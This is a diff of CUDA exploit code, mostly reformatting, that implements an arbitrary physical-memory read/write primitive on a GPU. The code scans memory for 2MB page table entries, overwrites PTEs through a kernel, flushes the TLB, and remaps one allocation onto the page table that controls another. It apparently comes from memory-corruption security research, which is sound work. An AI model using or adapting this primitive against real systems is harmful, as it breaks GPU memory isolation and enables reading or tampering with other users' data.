@@ -289,15 +289,17 @@ flush_tlb (uint8_t *flush_ptr, uint64_t flush_size)
   gpuErrchk (cudaPeekAtLastError ());
 }
 
-void modify(uint8_t *pte_local, uint64_t pte)
+void
+modify (uint8_t *pte_local, uint64_t pte)
 {
-  memset_ptr<<<1,1>>>(pte_local, pte, 8);
-  cudaDeviceSynchronize();
+  memset_ptr<<<1, 1>>> (pte_local, pte, 8);
+  cudaDeviceSynchronize ();
   gpuErrchk (cudaPeekAtLastError ());
 }
 
 void
-setup_cudaMalloc_primitive (ArbRW_Primtv &prim, std::vector<uint8_t *> &cudaMalloced_ptrs)
+setup_cudaMalloc_primitive (ArbRW_Primtv &prim,
+                            std::vector<uint8_t *> &cudaMalloced_ptrs)
 {
   // Used to Identify 2MB PTEs when scanning memory.
   const uint64_t mask_2MB_pte = 0xFF0000000000FFFFULL;
@@ -306,21 +308,25 @@ setup_cudaMalloc_primitive (ArbRW_Primtv &prim, std::vector<uint8_t *> &cudaMall
   uint64_t future_pt_ptr_pte_ofs = 0;
   for (uint64_t z = 0; z < 64L * KB; z += 16) // Each 2MB PTE is 16B
     {
-      DBG_OUT << (void *)z << ' ' << *(void **)(prim.data_device_ptr + z) << ' '
-              << (void *)((*(uint64_t *)(prim.data_device_ptr + z)) & mask_2MB_pte)
+      DBG_OUT << (void *)z << ' ' << *(void **)(prim.data_device_ptr + z)
+              << ' '
+              << (void *)((*(uint64_t *)(prim.data_device_ptr + z))
+                          & mask_2MB_pte)
               << '\n';
-      uint64_t pte_id = (*(uint64_t *)(prim.data_device_ptr + z)) & mask_2MB_pte;
+      uint64_t pte_id
+          = (*(uint64_t *)(prim.data_device_ptr + z)) & mask_2MB_pte;
 
       // Found a potential 2MB PTE, which we use for arbitrary rw
       if (pte_id == NULL_PTE && prim.arb_rw_phys == 0)
         {
-          prim.arb_rw_phys = *(uint64_t*)(prim.data_device_ptr + z); // PTE value
+          prim.arb_rw_phys
+              = *(uint64_t *)(prim.data_device_ptr + z); // PTE value
           prim.arb_rw_phys_ofs = z; // ofs RELATIVE to current 64KB PT pointer.
           DBG_OUT << "Found " << prim.arb_rw_phys << '\n';
         }
-      // If next immediate PTE is not 2MB, the previous one could've been an aligned 64KB page.
-      else if (pte_id != (NULL_PTE)
-               && prim.arb_rw_phys != 0)
+      // If next immediate PTE is not 2MB, the previous one could've been an
+      // aligned 64KB page.
+      else if (pte_id != (NULL_PTE) && prim.arb_rw_phys != 0)
         {
           prim.arb_rw_phys = 0;
           prim.arb_rw_phys_ofs = 0;
@@ -328,7 +334,8 @@ setup_cudaMalloc_primitive (ArbRW_Primtv &prim, std::vector<uint8_t *> &cudaMall
       // Get another 2MB PTE, which we use to point to page tables.
       else if (pte_id == (NULL_PTE))
         {
-          future_pt_ptr_pte_ofs = z; // ofs RELATIVE to current 64KB PT pointer.
+          future_pt_ptr_pte_ofs
+              = z; // ofs RELATIVE to current 64KB PT pointer.
           break;
         }
     }
@@ -343,14 +350,15 @@ setup_cudaMalloc_primitive (ArbRW_Primtv &prim, std::vector<uint8_t *> &cudaMall
 
   /**
    * prim.arb_rw_phys_ofs is by default used, where we remap that page to NULL
-   * 
+   *
    * We should be able to find this page now due to mismatch.
    */
-  prim.modify(NULL_PTE);
-  prim.flush_tlb();
+  prim.modify (NULL_PTE);
+  prim.flush_tlb ();
   for (int j = 0; j < cudaMalloced_ptrs.size (); j++)
     {
-      cudaMemcpyArray (prim.data_device_ptr, (uint8_t *)cudaMalloced_ptrs[j], 8);
+      cudaMemcpyArray (prim.data_device_ptr, (uint8_t *)cudaMalloced_ptrs[j],
+                       8);
       DBG_OUT << (void *)cudaMalloced_ptrs[j] << ' '
               << *(void **)prim.data_device_ptr << '\n';
       if (*(void **)prim.data_device_ptr != (void *)cudaMalloced_ptrs[j])
@@ -362,69 +370,96 @@ setup_cudaMalloc_primitive (ArbRW_Primtv &prim, std::vector<uint8_t *> &cudaMall
           break;
         }
     }
-  
+
   std::cout << "Found Arbitrary RW pointer candidate\n";
-  
+
   uint64_t it_ptr = NULL_PTE;
-  
+
   /**
-   * This is the offset of the arbitrary rw PTE in a 2MB page (prim.pt_ptr currently is a 64KB page)
-   * This will become the new offset used in the modify primitive (prim.arb_rw_phys_ofs), given we will use
-   * the new pt_ptr found in this loop
-   */ 
-  uint64_t target_pte_ofs = ((uint64_t)prim.pt_ptr + prim.arb_rw_phys_ofs) % ALLOC_SIZE;
+   * This is the offset of the arbitrary rw PTE in a 2MB page (prim.pt_ptr
+   * currently is a 64KB page) This will become the new offset used in the
+   * modify primitive (prim.arb_rw_phys_ofs), given we will use the new pt_ptr
+   * found in this loop
+   */
+  uint64_t target_pte_ofs
+      = ((uint64_t)prim.pt_ptr + prim.arb_rw_phys_ofs) % ALLOC_SIZE;
 
   // Scan GPU memory for the PTE of arb_rw_ptr.
-  for (uint64_t i = 0; i < get_memory_limit() - 1 * GB; i += ALLOC_SIZE)
+  for (uint64_t i = 0; i < get_memory_limit () - 1 * GB; i += ALLOC_SIZE)
     {
       // arb_rw_ptr now point to it_ptr.
-      prim.modify(it_ptr);
-      prim.flush_tlb();
+      prim.modify (it_ptr);
+      prim.flush_tlb ();
 
       // READ the known PTE position in a 2MB page
-      cudaMemcpyArray(prim.data_device_ptr, (uint8_t*)prim.arb_rw_ptr + target_pte_ofs, 8);
-      DBG_OUT << (void*)it_ptr << ' ' << *(void**)prim.data_device_ptr << '\n';
+      cudaMemcpyArray (prim.data_device_ptr,
+                       (uint8_t *)prim.arb_rw_ptr + target_pte_ofs, 8);
+      DBG_OUT << (void *)it_ptr << ' ' << *(void **)prim.data_device_ptr
+              << '\n';
 
-      // If the PTE match, then it_ptr is the PT page containing arb_rw_ptr's PTE.
-      if (*(void**)prim.data_device_ptr == (void*)it_ptr)
-      {
-        DBG_OUT << *(void**)prim.data_device_ptr << '\n';
-        break;
-      }
+      // If the PTE match, then it_ptr is the PT page containing arb_rw_ptr's
+      // PTE.
+      if (*(void **)prim.data_device_ptr == (void *)it_ptr)
+        {
+          DBG_OUT << *(void **)prim.data_device_ptr << '\n';
+          break;
+        }
       it_ptr += 0x20000;
     }
   std::cout << "Found PT location of Arbitrary RW pointer\n";
 
   // Now make the other cudaMalloc pointer we chose to point to this location.
-  prim.modify(future_pt_ptr_pte_ofs, it_ptr);
-  prim.flush_tlb();
+  prim.modify (future_pt_ptr_pte_ofs, it_ptr);
+  prim.flush_tlb ();
 
   prim.pt_phys = it_ptr;
 
   // Find the other remapped cudaMalloc pointer
-  for (int j = 0; j < cudaMalloced_ptrs.size(); j++)
-  {
-    cudaMemcpyArray(prim.data_device_ptr, (uint8_t*)cudaMalloced_ptrs[j], 8);
-    if ((void *)cudaMalloced_ptrs[j] != prim.arb_rw_ptr && *(void**)prim.data_device_ptr !=  (void *)cudaMalloced_ptrs[j])
+  for (int j = 0; j < cudaMalloced_ptrs.size (); j++)
     {
-      DBG_OUT << "PT rw:" << (void *)cudaMalloced_ptrs[j] << ' ' << *(void**)prim.data_device_ptr << ' ' << j << '\n';
+      cudaMemcpyArray (prim.data_device_ptr, (uint8_t *)cudaMalloced_ptrs[j],
+                       8);
+      if ((void *)cudaMalloced_ptrs[j] != prim.arb_rw_ptr
+          && *(void **)prim.data_device_ptr != (void *)cudaMalloced_ptrs[j])
+        {
+          DBG_OUT << "PT rw:" << (void *)cudaMalloced_ptrs[j] << ' '
+                  << *(void **)prim.data_device_ptr << ' ' << j << '\n';
 
-      // We can now use this instead of the 64KB pointer.
-      prim.pt_ptr = cudaMalloced_ptrs[j]; 
-      prim.pt_phys_ofs= j;
-      break;
+          // We can now use this instead of the 64KB pointer.
+          prim.pt_ptr = cudaMalloced_ptrs[j];
+          prim.pt_phys_ofs = j;
+          break;
+        }
     }
-  }
 
   // We use the known 2MB offset with the new pt_ptr
   prim.arb_rw_phys_ofs = target_pte_ofs;
 
   std::cout << "Found PT pointer candidate\n";
 
-  cudaMemcpyArray(prim.data_device_ptr, (uint8_t*)prim.pt_ptr + prim.arb_rw_phys_ofs, 8);
-  DBG_OUT << "PT rw:" << *(void**)prim.data_device_ptr<<  " Orig: "<< prim.pt_phys << '\n';
-  cudaMemcpyArray(prim.data_device_ptr, (uint8_t*)prim.arb_rw_ptr, 8);
-  DBG_OUT << "Arbitrary rw:" << *(void**)prim.data_device_ptr << " Orig: "<< prim.arb_rw_phys << '\n';
+  cudaMemcpyArray (prim.data_device_ptr,
+                   (uint8_t *)prim.pt_ptr + prim.arb_rw_phys_ofs, 8);
+  DBG_OUT << "PT rw:" << *(void **)prim.data_device_ptr
+          << " Orig: " << prim.pt_phys << '\n';
+  cudaMemcpyArray (prim.data_device_ptr, (uint8_t *)prim.arb_rw_ptr, 8);
+  DBG_OUT << "Arbitrary rw:" << *(void **)prim.data_device_ptr
+          << " Orig: " << prim.arb_rw_phys << '\n';
+}
+
+ArbRW_Primtv::ArbRW_Primtv ()
+{
+  cudaMallocManaged (&flush_ptr, flush_size);
+  cudaMallocManaged (&data_device_ptr, ALLOC_SIZE);
+
+  initialize_memory_loop<<<1, 1>>> (flush_ptr, flush_size);
+  cudaDeviceSynchronize ();
+  gpuErrchk (cudaPeekAtLastError ());
+}
+
+ArbRW_Primtv::~ArbRW_Primtv ()
+{
+  cudaFree (flush_ptr);
+  cudaFree (data_device_ptr);
 }
 
 void
@@ -444,31 +479,31 @@ ArbRW_Primtv::flush_tlb ()
 
 /**
  * @brief Set prim.arb_rw_ptr to point to pte
- * 
- * @param pte 
+ *
+ * @param pte
  */
 void
 ArbRW_Primtv::modify (uint64_t pte)
 {
-  memset_ptr<<<1,1>>>(pt_ptr + arb_rw_phys_ofs, pte, 8);
-  cudaDeviceSynchronize();
+  memset_ptr<<<1, 1>>> (pt_ptr + arb_rw_phys_ofs, pte, 8);
+  cudaDeviceSynchronize ();
 }
 
 /**
  * @brief Set some other pointer at ofs to pte
- * 
- * @param pte 
+ *
+ * @param pte
  */
 void
 ArbRW_Primtv::modify (uint64_t ofs, uint64_t pte)
 {
-  memset_ptr<<<1,1>>>(pt_ptr + ofs, pte, 8);
-  cudaDeviceSynchronize();
+  memset_ptr<<<1, 1>>> (pt_ptr + ofs, pte, 8);
+  cudaDeviceSynchronize ();
 }
 
 void
 ArbRW_Primtv::modify (uint8_t *ptr, uint64_t ofs, uint64_t pte)
 {
-  memset_ptr<<<1,1>>>(ptr + ofs, pte, 8);
-  cudaDeviceSynchronize();
+  memset_ptr<<<1, 1>>> (ptr + ofs, pte, 8);
+  cudaDeviceSynchronize ();
 }
